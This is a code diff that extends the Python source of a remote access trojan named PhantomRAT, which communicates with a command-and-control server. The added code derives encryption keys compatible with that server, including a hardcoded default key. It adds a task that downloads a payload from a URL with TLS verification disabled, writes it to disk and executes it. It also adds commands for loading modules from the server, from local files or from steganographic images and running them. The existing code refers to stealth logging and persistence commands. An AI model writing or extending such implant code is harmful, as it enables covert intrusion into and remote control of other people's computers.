@@ -20,6 +20,14 @@ import platform
 import psutil
 from datetime import datetime
 import subprocess
+import requests
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from phantomrat_modules import (
+    execute_module_function as dynamic_execute_module_function,
+    list_loaded_modules as dynamic_list_loaded_modules,
+    load_module as dynamic_load_module,
+)
 
 # Configure minimal logging for stealth
 logging.getLogger().setLevel(logging.ERROR)
@@ -48,40 +56,61 @@ except:
 # ==================== ENCRYPTION COMPATIBLE WITH C2 v4.0 ====================
 def get_encryption_key():
     """Get encryption key compatible with C2 v4.0"""
+    env_key = os.environ.get("PHANTOM_ENCRYPTION_KEY")
+    if env_key:
+        return env_key.encode()
+
     try:
         with open('malleable_profile.json', 'r') as f:
             profile = json.load(f)
             key = profile.get('encryption', {}).get('key')
             if key:
-                return key.encode()
-    except:
-        pass
-    
-    # Generate from system info (compatible with C2)
-    system_hash = hashlib.sha256(
-        f"{socket.gethostname()}{platform.machine()}{os.getpid()}".encode()
-    ).digest()
-    return system_hash[:32]  # Ensure 32 bytes
+                return str(key).encode()
+    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
+        print(f"[-] Could not load key from profile: {e}")
+
+    # Default shared key used by the dashboard
+    return b"phantomrat_32_char_encryption_key_here"
 
 ENCRYPTION_KEY = get_encryption_key()
+KDF_SALT = b"phantomrat_kdf_salt"
+KDF_ITERATIONS = 200_000
+
+
+def derive_fernet_key(secret: bytes) -> bytes:
+    """Derive a Fernet-compatible key using PBKDF2-HMAC-SHA256."""
+    if not isinstance(secret, (bytes, bytearray)):
+        secret = str(secret).encode()
+
+    profile_salt = profile.get('encryption', {}).get('salt', KDF_SALT) if 'profile' in globals() else KDF_SALT
+    if not isinstance(profile_salt, (bytes, bytearray)):
+        profile_salt = str(profile_salt).encode()
+
+    profile_iterations = profile.get('encryption', {}).get('iterations', KDF_ITERATIONS) if 'profile' in globals() else KDF_ITERATIONS
+    try:
+        profile_iterations = int(profile_iterations)
+    except (TypeError, ValueError):
+        profile_iterations = KDF_ITERATIONS
+
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=profile_salt,
+        iterations=profile_iterations,
+    )
+    return base64.urlsafe_b64encode(kdf.derive(secret))
 
 # Encryption class compatible with C2 v4.0
 class PhantomEncryption:
     def __init__(self, key):
         from cryptography.fernet import Fernet
         import base64
-        
+
         if isinstance(key, str):
             key = key.encode()
-        
-        # Ensure key is 32 bytes
-        if len(key) < 32:
-            key = key.ljust(32, b'0')[:32]
-        elif len(key) > 32:
-            key = key[:32]
-        
-        # Generate Fernet key (must be 32 url-safe base64-encoded bytes)
-        fernet_key = base64.urlsafe_b64encode(key)
+
+        # Normalize key length and derive the same Fernet material used by C2
+        fernet_key = derive_fernet_key(key)
         self.fernet = Fernet(fernet_key)
     
     def encrypt(self, data):
@@ -566,6 +595,137 @@ def download_file(filepath, chunk_size=8192):
     except Exception as e:
         return {'error': str(e)}
 
+
+def parse_task_arguments(args):
+    """Normalize task arguments into a dictionary."""
+    if isinstance(args, dict):
+        return args
+
+    if isinstance(args, str) and args.strip():
+        try:
+            return json.loads(args)
+        except Exception:
+            return {'value': args}
+
+    return {}
+
+
+def deploy_payload(payload_spec):
+    """Download or stage a payload and optionally execute it."""
+    spec = parse_task_arguments(payload_spec)
+
+    url = spec.get('url')
+    inline_content = spec.get('content')
+    destination = spec.get('destination', '/tmp/phantom_payload')
+    execute_now = bool(spec.get('execute', False))
+    interpreter = spec.get('interpreter')
+    mode = spec.get('mode', 'binary')
+
+    if not url and not inline_content:
+        return {'success': False, 'error': 'No payload source provided (url or content)'}
+
+    try:
+        if url:
+            headers = {'User-Agent': USER_AGENT}
+            response = requests.get(url, headers=headers, timeout=25, verify=False)
+            response.raise_for_status()
+            payload_data = response.content
+            source = url
+        else:
+            payload_data = base64.b64decode(inline_content)
+            source = 'inline'
+
+        os.makedirs(os.path.dirname(destination) or '.', exist_ok=True)
+        with open(destination, 'wb') as f:
+            f.write(payload_data)
+
+        result = {
+            'success': True,
+            'destination': destination,
+            'size': len(payload_data),
+            'source': source,
+        }
+
+        if execute_now:
+            if interpreter:
+                exec_cmd = [interpreter, destination]
+            elif mode == 'python':
+                exec_cmd = [sys.executable, destination]
+            else:
+                exec_cmd = [destination]
+
+            try:
+                proc = subprocess.run(
+                    exec_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=60,
+                )
+                result['execution'] = {
+                    'command': exec_cmd,
+                    'returncode': proc.returncode,
+                    'stdout': proc.stdout[-2048:],
+                    'stderr': proc.stderr[-2048:],
+                }
+                result['success'] = proc.returncode == 0
+            except Exception as exec_err:
+                result['execution'] = {'error': str(exec_err)}
+                result['success'] = False
+
+        return result
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+
+def load_dynamic_module(module_args):
+    """Load a Phantom module from the C2, local path, or stego source."""
+    args = parse_task_arguments(module_args)
+    module_name = args.get('name') or args.get('module') or args.get('value')
+    source = args.get('source', 'remote')
+    kwargs = {}
+
+    if not module_name:
+        return {'success': False, 'error': 'No module name provided'}
+
+    if source == 'local':
+        kwargs['filepath'] = args.get('path') or args.get('filepath')
+    elif source == 'stego':
+        kwargs['image_path'] = args.get('image') or args.get('image_path')
+        kwargs['method'] = args.get('method', 'lsb')
+
+    loaded = dynamic_load_module(module_name, source=source, **kwargs)
+
+    return {
+        'success': loaded is not None,
+        'module': module_name,
+        'source': source,
+        'loaded': bool(loaded),
+        'loaded_modules': dynamic_list_loaded_modules(),
+    }
+
+
+def execute_dynamic_module(call_args):
+    """Execute a function from a previously loaded Phantom module."""
+    args = parse_task_arguments(call_args)
+    module_name = args.get('module') or args.get('name') or args.get('value')
+    function_name = args.get('function') or args.get('func')
+    function_args = args.get('args', [])
+    function_kwargs = args.get('kwargs', {})
+
+    if not module_name or not function_name:
+        return {'success': False, 'error': 'module and function required'}
+
+    try:
+        result = dynamic_execute_module_function(module_name, function_name, *function_args, **function_kwargs)
+        return {
+            'success': True,
+            'module': module_name,
+            'function': function_name,
+            'result': result,
+        }
+    except Exception as e:
+        return {'success': False, 'error': str(e), 'module': module_name, 'function': function_name}
+
 def handle_command_v4(task):
     """Handle C2 v4.0 commands with improved error handling"""
     if not task or 'command' not in task:
@@ -632,6 +792,11 @@ def handle_command_v4(task):
                 result['success'] = result['output'].get('success', False)
             else:
                 result['output'] = {'error': 'No file specified'}
+
+        # ========== PAYLOAD DEPLOYMENT ==========
+        elif cmd == 'deploy_payload':
+            result['output'] = deploy_payload(args)
+            result['success'] = result['output'].get('success', False)
                 
         elif cmd == 'cd':
             if args:
@@ -739,6 +904,19 @@ def handle_command_v4(task):
                 result['success'] = True
             except Exception as e:
                 result['output'] = {'error': str(e)}
+
+        # ========== MODULE CONTROL ==========
+        elif cmd == 'load_module':
+            result['output'] = load_dynamic_module(args)
+            result['success'] = result['output'].get('success', False)
+
+        elif cmd == 'module_call':
+            result['output'] = execute_dynamic_module(args)
+            result['success'] = result['output'].get('success', False)
+
+        elif cmd == 'list_modules':
+            result['output'] = {'success': True, 'modules': dynamic_list_loaded_modules()}
+            result['success'] = True
                 
         # ========== PERSISTENCE COMMANDS ==========
         elif cmd == 'persist':
